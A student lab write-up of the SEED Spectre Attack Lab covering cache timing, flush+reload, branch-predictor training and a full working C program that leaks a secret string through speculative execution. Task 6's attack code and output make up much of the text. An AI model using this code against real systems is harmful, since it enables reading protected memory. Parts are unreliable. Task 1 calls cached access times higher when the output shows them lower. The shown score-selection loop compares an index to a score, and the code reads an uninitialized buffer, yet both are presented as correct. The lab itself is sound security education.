# Spectre Attack Lab

This week's suggested lab was Spectre Attack Lab, from SEED labs, with the intent of providing us a better understanding of how Spectre attack exploits critical vulnerabilities related to race conditions in many modern processors, of Intel, AMD, and ARM.

# Introduction

In this lab, as mentioned, we explore one of the vulnerabilities sitting in the design of modern CPUs. Because this flaw exists in the hardware, it is very difficult to fundamentally fix the problem, unless we change the CPUs in our computers. This lab covers the following topics:

- Spectre attack;
- Side-channel attack;
- CPU caching;
- Out-of-order execution and branch prediction inside CPU microarchitecture.

# Tasks

## Task 1

In the first task, we are asked to compare the time of accessing the CPU Cache with the time of accessing the Main Memory (RAM). As expected, the second is much slower. For that, we are given a `uint8_t` array of 10 * 4096 = 40960 bytes = 40 kb. This is to overcome the fact that each block cached in the CPU only, typically only has 64 bytes, meaning this way we will not get two elements to fall into the same cache block.

By running the provided script ten times using the following script:

```bash
#!/bin/bash
for i in {1..10}
do
    echo
    echo "################### Execution {$i} ######################"
    echo
    ./cacheTime
done
```

As we intentionally force the positions 3 and 7 of the array to be cached, their access times are much higher compared to the other array positions, which are not cached. We can see that by the following output:

```
################### Execution {1} ######################

Access time for array[0*4096]: 1812 CPU cycles
Access time for array[1*4096]: 429 CPU cycles
Access time for array[2*4096]: 225 CPU cycles
Access time for array[3*4096]: 62 CPU cycles
Access time for array[4*4096]: 223 CPU cycles
Access time for array[5*4096]: 231 CPU cycles
Access time for array[6*4096]: 878 CPU cycles
Access time for array[7*4096]: 71 CPU cycles
Access time for array[8*4096]: 225 CPU cycles
Access time for array[9*4096]: 222 CPU cycles

################### Execution {2} ######################

Access time for array[0*4096]: 1914 CPU cycles
Access time for array[1*4096]: 209 CPU cycles
Access time for array[2*4096]: 213 CPU cycles
Access time for array[3*4096]: 61 CPU cycles
Access time for array[4*4096]: 593 CPU cycles
Access time for array[5*4096]: 233 CPU cycles
Access time for array[6*4096]: 229 CPU cycles
Access time for array[7*4096]: 83 CPU cycles
Access time for array[8*4096]: 221 CPU cycles
Access time for array[9*4096]: 235 CPU cycles

################### Execution {3} ######################

Access time for array[0*4096]: 1802 CPU cycles
Access time for array[1*4096]: 222 CPU cycles
Access time for array[2*4096]: 228 CPU cycles
Access time for array[3*4096]: 72 CPU cycles
Access time for array[4*4096]: 221 CPU cycles
Access time for array[5*4096]: 203 CPU cycles
Access time for array[6*4096]: 225 CPU cycles
Access time for array[7*4096]: 79 CPU cycles
Access time for array[8*4096]: 209 CPU cycles
Access time for array[9*4096]: 227 CPU cycles

################### Execution {4} ######################

Access time for array[0*4096]: 1786 CPU cycles
Access time for array[1*4096]: 227 CPU cycles
Access time for array[2*4096]: 223 CPU cycles
Access time for array[3*4096]: 69 CPU cycles
Access time for array[4*4096]: 223 CPU cycles
Access time for array[5*4096]: 211 CPU cycles
Access time for array[6*4096]: 219 CPU cycles
Access time for array[7*4096]: 79 CPU cycles
Access time for array[8*4096]: 217 CPU cycles
Access time for array[9*4096]: 225 CPU cycles

################### Execution {5} ######################

Access time for array[0*4096]: 1881 CPU cycles
Access time for array[1*4096]: 225 CPU cycles
Access time for array[2*4096]: 225 CPU cycles
Access time for array[3*4096]: 77 CPU cycles
Access time for array[4*4096]: 207 CPU cycles
Access time for array[5*4096]: 196 CPU cycles
Access time for array[6*4096]: 220 CPU cycles
Access time for array[7*4096]: 80 CPU cycles
Access time for array[8*4096]: 223 CPU cycles
Access time for array[9*4096]: 210 CPU cycles

################### Execution {6} ######################

Access time for array[0*4096]: 1739 CPU cycles
Access time for array[1*4096]: 204 CPU cycles
Access time for array[2*4096]: 225 CPU cycles
Access time for array[3*4096]: 81 CPU cycles
Access time for array[4*4096]: 223 CPU cycles
Access time for array[5*4096]: 195 CPU cycles
Access time for array[6*4096]: 245 CPU cycles
Access time for array[7*4096]: 75 CPU cycles
Access time for array[8*4096]: 222 CPU cycles
Access time for array[9*4096]: 215 CPU cycles

################### Execution {7} ######################

Access time for array[0*4096]: 1887 CPU cycles
Access time for array[1*4096]: 219 CPU cycles
Access time for array[2*4096]: 228 CPU cycles
Access time for array[3*4096]: 87 CPU cycles
Access time for array[4*4096]: 519 CPU cycles
Access time for array[5*4096]: 221 CPU cycles
Access time for array[6*4096]: 220 CPU cycles
Access time for array[7*4096]: 83 CPU cycles
Access time for array[8*4096]: 235 CPU cycles
Access time for array[9*4096]: 237 CPU cycles

################### Execution {8} ######################

Access time for array[0*4096]: 1775 CPU cycles
Access time for array[1*4096]: 260 CPU cycles
Access time for array[2*4096]: 213 CPU cycles
Access time for array[3*4096]: 67 CPU cycles
Access time for array[4*4096]: 221 CPU cycles
Access time for array[5*4096]: 225 CPU cycles
Access time for array[6*4096]: 223 CPU cycles
Access time for array[7*4096]: 75 CPU cycles
Access time for array[8*4096]: 221 CPU cycles
Access time for array[9*4096]: 225 CPU cycles

################### Execution {9} ######################

Access time for array[0*4096]: 1807 CPU cycles
Access time for array[1*4096]: 211 CPU cycles
Access time for array[2*4096]: 494 CPU cycles
Access time for array[3*4096]: 67 CPU cycles
Access time for array[4*4096]: 214 CPU cycles
Access time for array[5*4096]: 200 CPU cycles
Access time for array[6*4096]: 219 CPU cycles
Access time for array[7*4096]: 69 CPU cycles
Access time for array[8*4096]: 202 CPU cycles
Access time for array[9*4096]: 200 CPU cycles

################### Execution {10} ######################

Access time for array[0*4096]: 1751 CPU cycles
Access time for array[1*4096]: 223 CPU cycles
Access time for array[2*4096]: 192 CPU cycles
Access time for array[3*4096]: 71 CPU cycles
Access time for array[4*4096]: 229 CPU cycles
Access time for array[5*4096]: 215 CPU cycles
Access time for array[6*4096]: 203 CPU cycles
Access time for array[7*4096]: 68 CPU cycles
Access time for array[8*4096]: 203 CPU cycles
Access time for array[9*4096]: 199 CPU cycles
```

From the experiment, we select the maximum accessing time to the third and seventh array positions (87 CPU cycles) as the threshold that denotes the difference between accessing CPU cache or Main Memory. This value is a bit high since the lab is being executed inside a virtual machine.

As a quick side note, we noticed the existence of `register` and `volatile` variables in the provided script. The `register` type gives the compiler a hint as they will be used heavily and be accessed frequently, it is better to keep it in the machine's register. The `volatile` type tells the compiler not to optimize anything that has to do with that kind of variable. A clear example of this use case can be found [here](https://stackoverflow.com/questions/246127/why-is-volatile-needed-in-c).

## Task 2

In this task, we use the CPU cache as a side-channel to extract a secret value used by the victim function. We first flush the entire array from the cache, then we access a secret array element making it to be cached, and finally, we test all the array elements in the hope to find the previously accessed one. In the providing script, note that no change was made to the initial `CACHE_HIT_THRESHOLD` macro value.

The following bash script was developed to run the `Flushreload.c` script twenty times:

```bash
#!/bin/bash
cnt=0
for i in {1..20}
do
    var=$(./flushReload)
    if [ ! -z "$var" ]
    then
        cnt=$((cnt + 1))
    fi
done

echo "Found register in cache {$cnt} times."
```

The output was as follows:

```
┌──(kali㉿kali)-[~/…/seed-labs/category-hardware/Spectre_Attack/Labsetup]
└─$ ./flushReload.sh
Found register in cache {17} times.
```

17 out of 20 executions detected the secret block in the cache, meaning the accuracy was 85%!

## Task 3

In this task, we experiment on whether the effect caused by an out-of-order execution can be seen or not. This is based on the fact that, as modern CPUs want to maximize the utilization of all their execution units, the execution of instructions is not sequential. Instead, it's parallel. This parallelization is based on heuristics of previous executions and when the CPU finds the prediction wrong, some incorrect instructions might have mistakenly been executed. Due to this, the CPU reverts its state, but several CPU makers forgot to wipe one thing, besides the out-of-order execution registers and memory, the CPU caches.

Compiling and running the script `SpectreExperiment.c`:

- **Without any changes**

    We observe the following output:

    ```
    ┌──(kali㉿kali)-[~/…/seed-labs/category-hardware/Spectre_Attack/Labsetup]
    └─$ ./spectreExperiment
    array[97*4096 + 1024] is in cache.
    The Secret = 97.
                                                                                                                                            
    ┌──(kali㉿kali)-[~/…/seed-labs/category-hardware/Spectre_Attack/Labsetup]
    └─$ ./spectreExperiment
                                                                                                                                            
    ┌──(kali㉿kali)-[~/…/seed-labs/category-hardware/Spectre_Attack/Labsetup]
    └─$ ./spectreExperiment
    array[97*4096 + 1024] is in cache.
    The Secret = 97.
    ```

    This means that the instruction `temp = array[x * 4096 + DELTA];` was indeed executed by the processor because with `x = 97`, the corresponding array element was found in the cache when it wasn't supposed to. This happens due to the reasons explained above. So, the CPU's decision was at first wrong, when opting for the `True` branch based on the "training", but it then realized it had to go with the `False` branch instead, and reverted its state. 

- **Commenting the line `_mm_clflush(&size);`**

    We observe the following output:

    ```
    ┌──(kali㉿kali)-[~/…/seed-labs/category-hardware/Spectre_Attack/Labsetup]
    └─$ ./spectreExperiment                         
                                                                                                                                            
    ┌──(kali㉿kali)-[~/…/seed-labs/category-hardware/Spectre_Attack/Labsetup]
    └─$ ./spectreExperiment
                                                                                                                                            
    ┌──(kali㉿kali)-[~/…/seed-labs/category-hardware/Spectre_Attack/Labsetup]
    └─$ ./spectreExperiment
    ```                                                                         
    In this case the instruction `temp = array[x * 4096 + DELTA];` wasn't executed for a simple reason: as we didn't flush the `size` variable from the cache, the time spent by the execution unit to load the `size` variable and to compare it with the `x` variable was much faster. The consequence of this is that the other execution unit that, in parallel, predicted that the `if` comparison was true based on the previous "training" phase and was moving forward to the next instruction, didn't have time to continue to run it and consequently, the `temp = array[x * 4096 + DELTA];` line didn't have time to be executed.

- **Replacing the line `victim(i);` with `victim(i + 20);`**

    We observe the following output:

    ```
    ┌──(kali㉿kali)-[~/…/seed-labs/category-hardware/Spectre_Attack/Labsetup]
    └─$ ./spectreExperiment                         
                                                                                                                                            
    ┌──(kali㉿kali)-[~/…/seed-labs/category-hardware/Spectre_Attack/Labsetup]
    └─$ ./spectreExperiment
                                                                                                                                            
    ┌──(kali㉿kali)-[~/…/seed-labs/category-hardware/Spectre_Attack/Labsetup]
    └─$ ./spectreExperiment
    ``` 

    The result is the as in the previous attempt, but the reason why this happens is different. The `if` comparison performed is if `x < size`, and `size` equals to 10. By modifying the code to `victim(i + 20);` we train the CPU to always evaluate as `False` the `if`comparison, so it's no surprise that when trying with the value 97, the CPU will go to the `False` branch, meaning it won't access the `array[97 * 4096 + DELTA];` element. Here the CPU's decision is right and the CPU optimization was right.

## Task 4

In this task, we're asked to run the Spectre Attack and get a piece of a secret string stored in a restricted area of memory. Using the same technique as the one presented in the previous task, we take advantage of the CPU's speculative execution. After the `SpectreAttack.c` script compilation and execution the output was as follows:

```
┌──(kali㉿kali)-[~/…/seed-labs/category-hardware/Spectre_Attack/Labsetup]
└─$ ./spectreAttack
secret: 0x5637a24ed008 
buffer: 0x5637a24ef038 
index of secret (out of bound): -8240 
array[0*4096 + 1024] is in cache.
The Secret = 0().
array[83*4096 + 1024] is in cache.
The Secret = 83(S).
```

Most of the executions were successful, so the noise in the side channel didn't influence them that much in the execution. In the aforementioned case, we can indeed see that the array's position 83 was indeed accessed inside the `restrictedAccess()` function which means the attack worked, as that position was in CPU cache. Besides position 83, we also see position 0. This is since after the CPU acknowledges the fact that it made a mistake when selecting the branch so, the `restrictedAccess()` function will `return 0` this time, and that value will be later cached, as in the example of the 83, by the execution of this line: `array[s*4096 + DELTA] += 88;`. That's why we see both 0 and 83 positions cached. Lastly, the meaning of the 83 has to do with the ASCII value of the first byte of our secret, "S", which is equal to 83. That is the value returned by the instruction `return buffer[x];` inside the `restrictedAccess()` function.

## Task 5

This task aims to demonstrate an improvement to the previously presented Spectre attack in task 4. Sometimes the results given are not very accurate, as happened in task 4. This has to do with noise in cache because CPU sometimes load extra values in cache expecting that they might be used at some later point, or simply because the threshold defined in the `CACHE_HIT_THRESHOLD` macro is too low. So far, the solution to solve this problem was to execute the program multiple times. But in this task we demonstrate how to solve it using a statistical technique that computes the secret based on a set of scores.

After compiling and executing the `SpectreAttackImproved.c` script, we get the following output:

```
┌──(kali㉿kali)-[~/…/seed-labs/category-hardware/Spectre_Attack/Labsetup]
└─$ ./spectreAttackImproved                             
Reading secret value at index -8248
The secret value is 0()
The number of hits is 690
```

As it can be observed, the secret value presented is 0 (`scores[0]`). It's something we didn't want to see. This has to do with this part of the code:

```c
int max = 0;
for (i = 0; i < 256; i++){
    if(scores[max] < scores[i]) max = i;
}
```

As we've seen in task 4 when our program succeeds, we get both array elements 0 and 83, and we know that every time Spectre Attack works, the CPU reverts its state and can increment the `scores[0]`. Due to this, and as we don't care about element 0 (ASCII value 0 is not a meaningful character either), we can simply start the loop at position 1 as well as initializing `max` with 1. The final code is as follows:

```c
int max = 1;
for (i = 1; i < 256; i++) {
    if(max < scores[i])
        max = i;
}
```

```
┌──(kali㉿kali)-[~/…/seed-labs/category-hardware/Spectre_Attack/Labsetup]
└─$ ./spectreAttackImproved
*****
*****
...
*****
Reading secret value at index -8256
The secret value is 83(S)
The number of hits is 141
```

As we can see, during the 1000 executions, we get 141 successful giving us an accuracy of approximately 14%. 

Regarding the mysterious line `printf("*****\n");`, even the Seed Labs creators weren't able to find the exact meaning of this. But it's indeed it is necessary to achieve our goal, as without it the attack fails. From what we've seen, performing the attack 1000 times in a row increases the number of CPU cycles when accessing CPU cache. The meaning of this line probably has to do with a bit of a slowing down process so that the reload of the side-channel is completed before starting the Spectre attack itself. With this line present, we get the same output as before. Without it, the attack simply doesn't work, as shown here:

```
┌──(kali㉿kali)-[~/…/seed-labs/category-hardware/Spectre_Attack/Labsetup]
└─$ ./spectreAttackImproved                             
Reading secret value at index -8248
The secret value is 1()
The number of hits is 0
```

> Note that the secret value is 1 because it's the default value. The number of hits is 0.

To finalize this task, the `usleep(10);` instruction causes the process to sleep for 10 microseconds between the execution of the Spectre Attack and the checking of the cached values. This significantly improves the chance of winning the race condition.

The experiments made were the following:

- Commenting the `usleep(10);` line:

    ```
    ┌──(kali㉿kali)-[~/…/seed-labs/category-hardware/Spectre_Attack/Labsetup]
    └─$ ./spectreAttackImproved
    *****
    *****
    ...
    *****
    Reading secret value at index -8248
    The secret value is 83(S)
    The number of hits is 3
    ```

    We see that the number of hits is quite low.

- With `usleep(10);` and `usleep(100);` the number of hits varies between around 20 and 180, which is quite a large interval. After this, with greater values, the number of hits starts to diminish again. Note that running the attack manually would give us a much higher chances of success.

## Task 6

In this task, we want to print the entire secret string. For that, simply keep executing in the loop the Spectre attack to the different bytes of the secret string. The code was mainly modified in the `main()` function to support the mentioned changes. 

```c
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>

unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
uint8_t temp    = 0;
char    *secret = "Some Secret Value";   
uint8_t array[256*4096];

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x <= bound_upper && x >= bound_lower) {
    return buffer[x];
  } else {
    return 0;
  }
}

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
}

static int scores[256];
void reloadSideChannelImproved()
{
  int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int junk = 0;
  for (i = 0; i < 256; i++) {
    addr = &array[i * 4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    // printf("Access time for array[%d*4096]: %d CPU cycles\n",i, (int)time2);
    if (time2 <= CACHE_HIT_THRESHOLD)
      scores[i]++; /* if cache hit, add 1 for this value */
  } 
}

void spectreAttack(size_t index_beyond)
{
  int i;
  uint8_t s;
  volatile int z;

  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }

  // Train the CPU to take the true branch inside victim().
  for (i = 0; i < 10; i++) {
    restrictedAccess(i);  
  }

  // Flush bound_upper, bound_lower, and array[] from the cache.
  _mm_clflush(&bound_upper);
  _mm_clflush(&bound_lower); 
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  for (z = 0; z < 100; z++)  {  }
  //
  // Ask victim() to return the secret in out-of-order execution.
  s = restrictedAccess(index_beyond);
  array[s*4096 + DELTA] += 88;
}

int main() {
  int i;
  uint8_t s;
  size_t index_beyond = (size_t)(secret - (char*)buffer);
  size_t secret_len = strlen(secret);
  char* spectre_secret = (char*) malloc(secret_len + 1);

  for (int k = 0; k < secret_len; k++) {    
    flushSideChannel();
    for(i=0;i<256; i++) scores[i]=0; 

    for (i = 0; i < 1000; i++) {
      printf("*****\n");  // This seemly "useless" line is necessary for the attack to succeed
      spectreAttack(index_beyond + k);
      usleep(10);
      reloadSideChannelImproved();
    }

    int max = 1;
    for (i = 1; i < 256; i++) {
      if(max < scores[i])
        max = i;
    }

    size_t idx = strlen(spectre_secret);
    spectre_secret[idx] = (char) max;

    printf("Reading secret value at index %ld\n", index_beyond);
    printf("The secret value is %d(%c)\n", max, max);
    printf("The number of hits is %d\n", scores[max]);
  }

  printf("Final Secret: %s", spectre_secret);

  return (0); 
}
```

The given output:

```
*****
*****
Reading secret value at index -8272
The secret value is 83(S)
The number of hits is 208
*****
*****
Reading secret value at index -8272
The secret value is 111(o)
The number of hits is 228
*****
*****
Reading secret value at index -8272
The secret value is 109(m)
The number of hits is 128
*****
*****
Reading secret value at index -8272
The secret value is 101(e)
The number of hits is 173
*****
*****
Reading secret value at index -8272
The secret value is 32( )
The number of hits is 264
*****
*****
Reading secret value at index -8272
The secret value is 83(S)
The number of hits is 209
*****
*****
Reading secret value at index -8272
The secret value is 101(e)
The number of hits is 196
*****
*****
Reading secret value at index -8272
The secret value is 99(c)
The number of hits is 178
*****
*****
Reading secret value at index -8272
The secret value is 114(r)
The number of hits is 188
*****
*****
Reading secret value at index -8272
The secret value is 101(e)
The number of hits is 189
*****
*****
Reading secret value at index -8272
The secret value is 116(t)
The number of hits is 231
*****
*****
Reading secret value at index -8272
The secret value is 32( )
The number of hits is 182
*****
*****
Reading secret value at index -8272
The secret value is 86(V)
The number of hits is 172
*****
*****
Reading secret value at index -8272
The secret value is 97(a)
The number of hits is 165
*****
*****
Reading secret value at index -8272
The secret value is 108(l)
The number of hits is 95
*****
*****
Reading secret value at index -8272
The secret value is 117(u)
The number of hits is 204
*****
*****
Reading secret value at index -8272
The secret value is 101(e)
The number of hits is 180
Final Secret: Some Secret Value
```

As observed, the last line contains the content of the secret.

**Authors (Group 5):**
- Diogo Rodrigues up201806429
- Pedro Azevedo up201603816
- Rui Pinto up201806441